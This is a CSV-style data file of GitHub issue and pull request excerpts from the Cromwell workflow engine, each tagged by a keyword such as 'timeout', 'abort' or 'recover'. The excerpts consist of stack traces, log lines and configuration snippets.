perspective.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6803:1135,Timeout,Timeout-Access,1135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6803,1,['Timeout'],['Timeout-Access']
Safety,[WX-1301] Increase default timeout from 7 to 14 days,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7226:27,timeout,timeout,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7226,1,['timeout'],['timeout']
Safety,[WX-1448] Add verbose logging and timeout for getm,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7416:34,timeout,timeout,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7416,1,['timeout'],['timeout']
Safety,[develop edition] GCS IO safety and test bucket size calls [BW-411],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5993:25,safe,safety,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993,1,['safe'],['safety']
Safety,"[develop edition] Update job abort handling for PAPIv2 ""Catherine"" [BW-408]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5995:29,abort,abort,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5995,1,['abort'],['abort']
Safety,[develop] Call-by-name to avoid instantiating default commands if unused [BW-416],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5991:26,avoid,avoid,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5991,1,['avoid'],['avoid']
Safety,"\""type\"": [\n \""null\"",\n \""float\""\n ],\n \""doc\"": \""Proportion of somatic deviation to include in fitted purity score. Default 1.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-somatic_penalty_weight\""\n },\n \""default\"": 1,\n \""id\"": \""#purple-2.44.cwl/somatic_penalty_weight\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional location of somatic variant vcf to assist fitting in highly-diploid samples.\\nSample name must match tumor parameter. GZ files supported.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-somatic_vcf\""\n },\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#purple-2.44.cwl/somatic_vcf\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Optional location of structural variant vcf for more accurate segmentation.\\nGZ files supported.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-structural_vcf\""\n },\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#purple-2.44.cwl/structural_vcf\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""Optional location of failing structural variants that may be recovered.\\nGZ files supported.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-sv_recovery_vcf\""\n },\n \""secondaryFiles\"": [\n \"".tbi\""\n ],\n \""id\"": \""#purple-2.44.cwl/sv_recovery_vcf\""\n },\n {\n \""type\"": [\n \""null\"",\n \""int\""\n ],\n \""doc\"": \""Number of threads\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-threads\""\n },\n \""default\"": 2,\n \""id\"": \""#purple-2.44.cwl/threads\""\n },\n {\n \""type\"": \""string\"",\n \""doc\"": \""Name of the tumor sample. This should correspond to the value used in AMBER and COBALT.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor\""\n },\n \""id\"": \""#purple-2.44.cwl/tumor\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Tumor only mode. Disables somatic fitting.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-tumor_only\""\n },\n \""default\"": false,\n \""id\"": \""#purple-2.44.cwl/tumor_only\""\n }\n ],\n \""outputs\"": [\n {\n \""type\"": \""Directory\"",\n \""outputBinding\"": {\n \""glob\""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:101937,recover,recovered,101937,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['recover'],['recovered']
Safety,"`JesCallPaths` extends `JesWorkflowPaths` and appears to create a lot of workflow-level data redundantly. Besides wasting time and possibly money, this causes unnecessary calls to Google APIs which count against our QPS limits. During 9/16 JG testing we saw an error creating `storage` in `JesWorkflowPaths` (which should have been treated as a transient error per #1436), but it seems that storage should have been created as part of the `JesBackendInitializationData` by the `JesInitializationActor` and then simply passed to the job actors.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1437:93,redund,redundantly,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1437,1,['redund'],['redundantly']
Safety,"```$anon$1 was thrown during property evaluation. (SharedFileSystemJobExecutionActorSpec.scala:119)&#010; Message: A timeout occurred waiting for a future to complete. Queried 21 times, sleeping 500 milliseconds between each query.```. ```A timeout occurred waiting for a future to complete. Queried 21 times, sleeping 500 milliseconds between each query.```. https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/165/. If one needs more info please talk to @ndbolliger",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4222:117,timeout,timeout,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4222,2,['timeout'],['timeout']
Safety,```; [ERROR] [01/27/2017 13:33:05.570] [cromwell-system-akka.dispatchers.engine-dispatcher-30] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow 0fcd7ba4-f1e0-4e16-9b67-c83ad2378f44 failed (during ExecutingWorkflowState): Could not evaluate no_address.out = read_string(stdout()); java.lang.RuntimeException: Could not evaluate no_address.out = read_string(stdout()); 	at wdl4s.Task$$anonfun$11$$anonfun$4.applyOrElse(Task.scala:182); 	at wdl4s.Task$$anonfun$11$$anonfun$4.applyOrElse(Task.scala:181); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at wdl4s.Task$$anonfun$11.apply(Task.scala:181); 	at wdl4s.Task$$anonfun$11.apply(Task.scala:174); 	at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:157); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:157); 	at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); 	at wdl4s.Task.evaluateOutputs(Task.scala:174); 	at cromwell.backend.wdl.OutputEvaluator$.evaluateOutputs(OutputEvaluator.scala:15); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.postProcess(JesAsyncBackendJobExecutionActor.scala:366); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionSuccess(JesAsyncBackendJobExecutionActor.scala:391); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionSuccess(JesAsyncBackendJobExecutionActor.scala:46); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1923:656,recover,recoverWith,656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1923,1,['recover'],['recoverWith']
Safety,```; java -Dconfig.file=/root/cromwell-application.conf -jar /root/cromwell/cromwell-62.jar run hello.wdl; ```. ```; WorkflowManagerActor: Workflow 19f1873b-7e61-4683-9585-747bf842a261 failed (during ExecutingWorkflowState): java.lang.Exception: Job id job-0000000060963A8300007BD2000D7072 failed: 'cluster(job-0000000060963A8300007BD2000D7072_cromwell_0) error: InvalidArgument'; 	at cromwell.backend.impl.bcs.BcsAsyncBackendJobExecutionActor.handleExecutionFailure(BcsAsyncBackendJobExecutionActor.scala:281); 	at cromwell.backend.impl.bcs.BcsAsyncBackendJobExecutionActor.handleExecutionFailure(BcsAsyncBackendJobExecutionActor.scala:32); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1315); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1311); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6352:969,recover,recoverWith,969,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6352,1,['recover'],['recoverWith']
Safety,a big issue w/ abort is not that it doesn't claim it aborted in the response but all hell breaks loose internally :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659:15,abort,abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-288836659,2,['abort'],"['abort', 'aborted']"
Safety,a.util.Try$.apply(Try.scala:209); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.isAlive$(SharedFileSystemAsyncJobExecutionActor.scala:191); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.isAlive(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.reconnectToExistingJob(SharedFileSystemAsyncJobExecutionActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.recover$(SharedFileSystemAsyncJobExecutionActor.scala:159); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:305); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:305); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.recoverAsync(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:574); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:569); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:190); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2963:1870,recover,recoverAsync,1870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2963,1,['recover'],['recoverAsync']
Safety,"a/cromwell/engine/io/IoActor.scala#L119) and processed subsequently in an S3 specific manner, like it's currently done for GCS, to be useful. Because this isn't the case now, the S3 code in `S3BatchIoCommand` is effectively never called.; - It works because there is an implementation of java nio for S3. The `S3BatchIoCommand` ends up in the [NioFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala) which uses the methods of the nio interface to execute the commands.; **A big issue is that the nio interface does not have a ""hash"" method**. To work around that, the `NioFlow` [streams down the content and md5s it](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L111), [unless told otherwise](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109). This is what's currently happening to S3 files. As a final twist, it turns out the [pattern match on GcsPath](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/engine/src/main/scala/cromwell/engine/io/nio/NioFlow.scala#L109) in the hash method is actually just a fail safe but is not really needed. That is because some `IoCommand`s, including the `IoHashCommand`, are subclassed as `GcsBatchIoCommand`s and are processed through the [GcsBatchFlow](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/io/gcs/GcsBatchFlow.scala). The main goal of this ""flow"" is to batch requests to google together to increase throughput but by doing so also allows to interact with the GCS API directly and get the [crc32 from there](https://github.com/broadinstitute/cromwell/blob/ec67d653c58c9c5b4b25609731a8082f3b540fe6/filesystems/gcs/src/main/scala/cromwell/filesystems/gcs/batch/GcsBatchIoCommand.scala#L129).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4463:1801,safe,safe,1801,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4463,1,['safe'],['safe']
Safety,a18-4241-8f6b-0b72e181f59a failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:2019,unsafe,unsafeToFuture,2019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['unsafe'],['unsafeToFuture']
Safety,"a:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9936,abort,abort,9936,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"a:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClient",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12175,abort,abort,12175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"a:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:19239,abort,abort,19239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"a:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparse",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21547,abort,abort,21547,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"abel-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # batch-timeout = 7 days. genomics {; auth = ""cromwell-service-account""; location: ""${region}""; compute-service-account = ""${compute_service_account}"". # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. filesystems {; gcs {; auth = ""cromwell-service-account"". # For billing; project = ""${billing_project}"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }. }; http {}; }. # Important!! Some of the workflows take an excessive amount of time to run; batch-timeout = 28 days. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: true; preemptible: 0; docker: ""ubuntu:latest""; }. virtual-private-cloud {; network-name = ""${private_network}""; subnetwork-name = ""${private_subnet}""; }; }; }; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238:3593,timeout,timeout,3593,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238,1,['timeout'],['timeout']
Safety,abort-all-workflows-on-terminate does not clean up the WorkflowStore,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2492:0,abort,abort-all-workflows-on-terminate,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2492,1,['abort'],['abort-all-workflows-on-terminate']
Safety,"ached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that has run multiple times, using call-caching and sometimes with slightly different settings: **85 GB** in files for the database.); MySQL performs much better with cromwell, but is infeasible to use in a per-project, per-user fashion. [I am working on solving the problem using 